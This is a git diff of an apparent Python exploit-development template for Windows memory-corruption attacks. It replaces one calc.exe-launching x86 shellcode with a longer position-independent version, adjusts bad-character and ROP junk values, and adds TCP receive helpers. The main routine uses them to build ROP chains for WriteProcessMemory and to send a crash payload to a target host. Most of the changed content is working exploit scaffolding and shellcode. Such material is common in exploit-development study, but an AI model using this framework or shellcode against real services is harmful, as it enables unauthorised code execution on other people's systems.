@@ -17,7 +17,7 @@ sock = None
 
 # Badchars
 badchars = [ 0x0 , 0xa, 0xd]  
-ropjunk = 0x69696969
+ropjunk = 0x60606060
 
 class Colors:
     """ ANSI color codes """
@@ -758,74 +758,86 @@ class Shellcode:
         return shellcode
 
     def asmcalcShellcode():
-        # Source from: https://github.com/peterferrie/win-exec-calc-shellcode/tree/master
-        # Compiled using;
-        # $ nasm -f win32 -o win-exec-calc-shellcode.o win-exec-calc-shellcode.asm
-        # $ ld -m i386pe -o win-exec-calc-shellcode.bin win-exec-calc-shellcode.o
-        # Payload size: 127 bytes
+        # Source from: https://github.com/hodor-sec/Shellcoding/blob/master/shellcode/asm/calc/win_x86_winexec_calc_pic.asm
+        # Payload size: 201 bytes
         shellcode = (
-                b"\x31\xc0"                        # 0x0         xor  eax, eax
-                b"\x50"                            # 0x2         push eax
-                b"\x68\x63\x61\x6c\x63"            # 0x3         push 0x636c6163
-                b"\x54"                            # 0x8         push esp
-                b"\x59"                            # 0x9         pop  ecx
-                b"\x50"                            # 0x10        push eax
-                b"\x40"                            # 0x11        inc  eax
-                b"\x92"                            # 0x12        xchg eax, edx
-                b"\x74\x15"                        # 0x13        je   0x24
-                b"\x51"                            # 0x15        push ecx
-                b"\x64\x8b\x72\x2f"                # 0x16        mov  esi, dword ptr fs:[edx + 0x2f]
-                b"\x8b\x76\x0c"                    # 0x20        mov  esi, dword ptr [esi + 0xc]
-                b"\x8b\x76\x0c"                    # 0x23        mov  esi, dword ptr [esi + 0xc]
-                b"\xad"                            # 0x26        lodsdeax, dword ptr [esi]
-                b"\x8b\x30"                        # 0x27        mov  esi, dword ptr [eax]
-                b"\x8b\x7e\x18"                    # 0x29        mov  edi, dword ptr [esi + 0x18]
-                b"\xb2\x50"                        # 0x32        mov  dl, 0x50
-                b"\xeb\x1a"                        # 0x34        jmp  0x3e
-                b"\xb2\x60"                        # 0x36        mov  dl, 0x60
-                b"\x48"                            # 0x38        dec  eax
-                b"\x29\xd4"                        # 0x39        sub  esp, edx
-                b"\x65\x48"                        # 0x41        dec  eax
-                b"\x8b\x32"                        # 0x43        mov  esi, dword ptr [edx]
-                b"\x48"                            # 0x45        dec  eax
-                b"\x8b\x76\x18"                    # 0x46        mov  esi, dword ptr [esi + 0x18]
-                b"\x48"                            # 0x49        dec  eax
-                b"\x8b\x76\x10"                    # 0x50        mov  esi, dword ptr [esi + 0x10]
-                b"\x48"                            # 0x53        dec  eax
-                b"\xad"                            # 0x54        lodsdeax, dword ptr [esi]
-                b"\x48"                            # 0x55        dec  eax
-                b"\x8b\x30"                        # 0x56        mov  esi, dword ptr [eax]
-                b"\x48"                            # 0x58        dec  eax
-                b"\x8b\x7e\x30"                    # 0x59        mov  edi, dword ptr [esi + 0x30]
-                b"\x03\x57\x3c"                    # 0x62        add  edx, dword ptr [edi + 0x3c]
-                b"\x8b\x5c\x17\x28"                # 0x65        mov  ebx, dword ptr [edi + edx + 0x28]
-                b"\x8b\x74\x1f\x20"                # 0x69        mov  esi, dword ptr [edi + ebx + 0x20]
-                b"\x48"                            # 0x73        dec  eax
-                b"\x01\xfe"                        # 0x74        add  esi, edi
-                b"\x8b\x54\x1f\x24"                # 0x76        mov  edx, dword ptr [edi + ebx + 0x24]
-                b"\x0f\xb7\x2c\x17"                # 0x80        movzxebp, word ptr [edi + edx]
-                b"\x8d\x52\x02"                    # 0x84        lea  edx, [edx + 2]
-                b"\xad"                            # 0x87        lodsdeax, dword ptr [esi]
-                b"\x81\x3c\x07\x57\x69\x6e\x45"    # 0x88        cmp  dword ptr [edi + eax], 0x456e6957
-                b"\x75\xef"                        # 0x95        jne  0x50
-                b"\x8b\x74\x1f\x1c"                # 0x97        mov  esi, dword ptr [edi + ebx + 0x1c]
-                b"\x48"                            # 0x101       dec  eax
-                b"\x01\xfe"                        # 0x102       add  esi, edi
-                b"\x8b\x34\xae"                    # 0x104       mov  esi, dword ptr [esi + ebp*4]
-                b"\x48"                            # 0x107       dec  eax
-                b"\x01\xf7"                        # 0x108       add  edi, esi
-                b"\x99"                            # 0x110       cdq
-                b"\xff\xd7"                        # 0x111       call edi
-                b"\xff"                            # 0x113       db   0xff
-                b"\xff"                            # 0x114       db   0xff
-                b"\xff"                            # 0x115       db   0xff
-                b"\xff\x00"                        # 0x116       inc  dword ptr [eax]
-                b"\x00\x00"                        # 0x118       add  byte ptr [eax], al
-                b"\xff"                            # 0x120       db   0xff
-                b"\xff"                            # 0x121       db   0xff
-                b"\xff"                            # 0x122       db   0xff
-                b"\xff\x00"                        # 0x123       inc  dword ptr [eax]
-                b"\x00\x00"                        # 0x125       add  byte ptr [eax], al
+                b"\x89\xe5"                             # 0   / 0x0              mov ebp, esp
+                b"\x81\xc4\xf0\xf9\xff\xff"             # 2   / 0x2              add esp, 0xfffff9f0
+                b"\x31\xc9"                             # 8   / 0x8              xor ecx, ecx
+                b"\x64\x8b\x71\x30"                     # 10  / 0xa              mov esi, dword ptr fs:[ecx + 0x30]
+                b"\x8b\x76\x0c"                         # 14  / 0xe              mov esi, dword ptr [esi + 0xc]
+                b"\x8b\x76\x1c"                         # 17  / 0x11             mov esi, dword ptr [esi + 0x1c]
+                b"\x8b\x5e\x08"                         # 20  / 0x14             mov ebx, dword ptr [esi + 8]
+                b"\x8b\x7e\x20"                         # 23  / 0x17             mov edi, dword ptr [esi + 0x20]
+                b"\x8b\x36"                             # 26  / 0x1a             mov esi, dword ptr [esi]
+                b"\x66\x39\x4f\x18"                     # 28  / 0x1c             cmp word ptr [edi + 0x18], cx
+                b"\x75\xf2"                             # 32  / 0x20             jne 0x14
+                b"\xeb\x06"                             # 34  / 0x22             jmp 0x2a
+                b"\x5e"                                 # 36  / 0x24             pop esi
+                b"\x89\x75\x04"                         # 37  / 0x25             mov dword ptr [ebp + 4], esi
+                b"\xeb\x54"                             # 40  / 0x28             jmp 0x7e
+                b"\xe8\xf5\xff\xff\xff"                 # 42  / 0x2a             call 0x24
+                b"\x60"                                 # 47  / 0x2f             pushal
+                b"\x8b\x43\x3c"                         # 48  / 0x30             mov eax, dword ptr [ebx + 0x3c]
+                b"\x8b\x7c\x03\x78"                     # 51  / 0x33             mov edi, dword ptr [ebx + eax + 0x78]
+                b"\x01\xdf"                             # 55  / 0x37             add edi, ebx
+                b"\x8b\x4f\x18"                         # 57  / 0x39             mov ecx, dword ptr [edi + 0x18]
+                b"\x8b\x47\x20"                         # 60  / 0x3c             mov eax, dword ptr [edi + 0x20]
+                b"\x01\xd8"                             # 63  / 0x3f             add eax, ebx
+                b"\x89\x45\xfc"                         # 65  / 0x41             mov dword ptr [ebp - 4], eax
+                b"\xe3\x36"                             # 68  / 0x44             jecxz 0x7c
+                b"\x49"                                 # 70  / 0x46             dec ecx
+                b"\x8b\x45\xfc"                         # 71  / 0x47             mov eax, dword ptr [ebp - 4]
+                b"\x8b\x34\x88"                         # 74  / 0x4a             mov esi, dword ptr [eax + ecx*4]
+                b"\x01\xde"                             # 77  / 0x4d             add esi, ebx
+                b"\x31\xc0"                             # 79  / 0x4f             xor eax, eax
+                b"\x99"                                 # 81  / 0x51             cdq
+                b"\xfc"                                 # 82  / 0x52             cld
+                b"\xac"                                 # 83  / 0x53             lodsb al, byte ptr [esi]
+                b"\x84\xc0"                             # 84  / 0x54             test al, al
+                b"\x74\x07"                             # 86  / 0x56             je 0x5f
+                b"\xc1\xca\x0d"                         # 88  / 0x58             ror edx, 0xd
+                b"\x01\xc2"                             # 91  / 0x5b             add edx, eax
+                b"\xeb\xf4"                             # 93  / 0x5d             jmp 0x53
+                b"\x3b\x54\x24\x24"                     # 95  / 0x5f             cmp edx, dword ptr [esp + 0x24]
+                b"\x75\xdf"                             # 99  / 0x63             jne 0x44
+                b"\x8b\x57\x24"                         # 101 / 0x65             mov edx, dword ptr [edi + 0x24]
+                b"\x01\xda"                             # 104 / 0x68             add edx, ebx
+                b"\x66\x8b\x0c\x4a"                     # 106 / 0x6a             mov cx, word ptr [edx + ecx*2]
+                b"\x8b\x57\x1c"                         # 110 / 0x6e             mov edx, dword ptr [edi + 0x1c]
+                b"\x01\xda"                             # 113 / 0x71             add edx, ebx
+                b"\x8b\x04\x8a"                         # 115 / 0x73             mov eax, dword ptr [edx + ecx*4]
+                b"\x01\xd8"                             # 118 / 0x76             add eax, ebx
+                b"\x89\x44\x24\x1c"                     # 120 / 0x78             mov dword ptr [esp + 0x1c], eax
+                b"\x61"                                 # 124 / 0x7c             popal
+                b"\xc3"                                 # 125 / 0x7d             ret
+                b"\x68\x83\xb9\xb5\x78"                 # 126 / 0x7e             push 0x78b5b983
+                b"\xff\x55\x04"                         # 131 / 0x83             call dword ptr [ebp + 4]
+                b"\x89\x45\x10"                         # 134 / 0x86             mov dword ptr [ebp + 0x10], eax
+                b"\x68\x66\x19\xda\x75"                 # 137 / 0x89             push 0x75da1966
+                b"\xff\x55\x04"                         # 142 / 0x8e             call dword ptr [ebp + 4]
+                b"\x89\x45\x14"                         # 145 / 0x91             mov dword ptr [ebp + 0x14], eax
+                b"\x68\x8e\x4e\x0e\xec"                 # 148 / 0x94             push 0xec0e4e8e
+                b"\xff\x55\x04"                         # 153 / 0x99             call dword ptr [ebp + 4]
+                b"\x89\x45\x18"                         # 156 / 0x9c             mov dword ptr [ebp + 0x18], eax
+                b"\x68\x98\xfe\x8a\x0e"                 # 159 / 0x9f             push 0xe8afe98
+                b"\xff\x55\x04"                         # 164 / 0xa4             call dword ptr [ebp + 4]
+                b"\x89\x45\x1c"                         # 167 / 0xa7             mov dword ptr [ebp + 0x1c], eax
+                b"\xeb\x03"                             # 170 / 0xaa             jmp 0xaf
+                b"\xff\x55\x14"                         # 172 / 0xac             call dword ptr [ebp + 0x14]
+                b"\x31\xc0"                             # 175 / 0xaf             xor eax, eax
+                b"\x40"                                 # 177 / 0xb1             inc eax
+                b"\x50"                                 # 178 / 0xb2             push eax
+                b"\x48"                                 # 179 / 0xb3             dec eax
+                b"\x66\x50"                             # 180 / 0xb4             push ax
+                b"\x68\x63\x61\x6c\x63"                 # 182 / 0xb6             push 0x636c6163
+                b"\x89\xe3"                             # 187 / 0xbb             mov ebx, esp
+                b"\x53"                                 # 189 / 0xbd             push ebx
+                b"\xff\x55\x1c"                         # 190 / 0xbe             call dword ptr [ebp + 0x1c]
+                b"\x31\xc9"                             # 193 / 0xc1             xor ecx, ecx
+                b"\x51"                                 # 195 / 0xc3             push ecx
+                b"\x6a\xff"                             # 196 / 0xc4             push -1
+                b"\xff\x55\x10"                         # 198 / 0xc6             call dword ptr [ebp + 0x10]
         )
         return shellcode
 
@@ -1167,12 +1179,13 @@ class Network:
                 if recvbuffered:
                     chunksize = 0
                     resp = b""
-                    # Receive initial response size
+                    # Receive initial response and response size
                     initresp = sock.recv(recvsize)
-                    print(f"Received initial size data: {initresp.hex()}")
+                    respsize = len(initresp)
+                    print(f"Received initial size data: {hex(respsize)}")
                     try:
-                        respsize = int(initresp.hex(), 16)
-                        print(f"[*] The read/write size returned: {respsize:x} bytes")
+                        #respsize = len(initresp)
+                        print(f"[*] The read/write size returned: {hex(respsize)} bytes")
                     except ValueError:
                         print("[!] Error parsing the response size")
                         return None
@@ -1240,7 +1253,77 @@ class Network:
                 if sock:
                     sock.close()
                 sys.exit(0)
-        
+                
+        # Use or create global TCP socket; receive only
+        def recvsocktcp(recvsize=1024, keepopen=True):
+            global sock
+            try:
+                # Check if the socket is open, otherwise create a new one
+                if not (sock and sock.fileno() != -1):
+                    print("[!] Socket not open, reopening...")
+                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
+                # Send data
+                resp = sock.recv(recvsize)
+                if not keepopen:
+                    sock.close()
+                return resp
+            except socket.timeout:
+                print("[!] Socket timeout.")
+                if not keepopen:
+                    sock.close()
+                sys.exit(0)
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
+            except KeyboardInterrupt:
+                print("[!] Operation interrupted by user.")
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+        def recvsocktcp_readline(keepopen=True, timeout=None):
+            global sock
+            try:
+                # Check if the socket is open, otherwise create a new one
+                if not (sock and sock.fileno() != -1):
+                    print("[!] Socket not open, reopening...")
+                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
+                if timeout:
+                    sock.settimeout(timeout)  # Set socket timeout if provided
+                # Read data line by line from the socket
+                data = sock.makefile('r'). readline()  # Using makefile() to handle readline
+                if not data:
+                    print("[!] No data received.")
+                    if not keepopen:
+                        sock.close()
+                    return None
+                # If the connection is to be closed after reading one line
+                if not keepopen:
+                    sock.close()
+                return data.strip()  # Strip newline and return the line
+
+            except socket.timeout:
+                print("[!] Socket timeout.")
+                if not keepopen:
+                    sock.close()
+                sys.exit(0)
+
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+            except KeyboardInterrupt:
+                print("[!] Operation interrupted by user.")
+                if sock:
+                    sock.close()
+                sys.exit(0)
+                        
         # Regular sendrecv TCP socket
         def sendrecvtcp(host,port,buffer,recv=True,recvsize=1024):
             try:
@@ -1275,7 +1358,8 @@ class Network:
                 Helpers.keyboard_interrupt() 
 
         # Flush a given or global TCP socket
-        def flushsocktcp(timeout=timeout,chunk_size=1024,socket=False,retries=5):
+        def flushsocktcp(timeout=timeout,chunk_size=1024,retries=5):
+            global sock
             # Check if the socket is valid and initialized
             if not isinstance(sock, socket.socket):
                 raise ValueError("No socket to flush.")
@@ -1285,6 +1369,7 @@ class Network:
                 while attempts < retries:
                     # Try to read data from the socket
                     data = sock.recv(chunk_size)
+                    print(data)
                     if not data:
                         break  # No more data, buffer is flushed
                     # Optionally handle or discard data
@@ -1384,6 +1469,7 @@ def main(argv):
     # Globals
     global host, port
     global timeout
+    global sock
 
     # Vars
     host = args.host
@@ -1393,6 +1479,7 @@ def main(argv):
 
     ### ADD VARS HERE ###
     intmainbaseaddr = 0x0
+    intwpmaddr = 0x0
     intbaselib = 0x0
     lenbadscchars = 0x0  
     lenropdecoder = 0x0
@@ -1515,7 +1602,7 @@ def main(argv):
         ###########################################
         print(Colors.BOLD + "\n[*] SENDING CRASH PAYLOAD...\n" + Colors.END)
         # Create socket
-        gsock = Network.TCP.creategsocktcp(host,port)
+        sock = Network.TCP.creategsocktcp(host,port)
         # Send data
         paylCrash = Payload.poccrash(intbaselib,ropskelwpm,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
         # Send EIP/CRASH
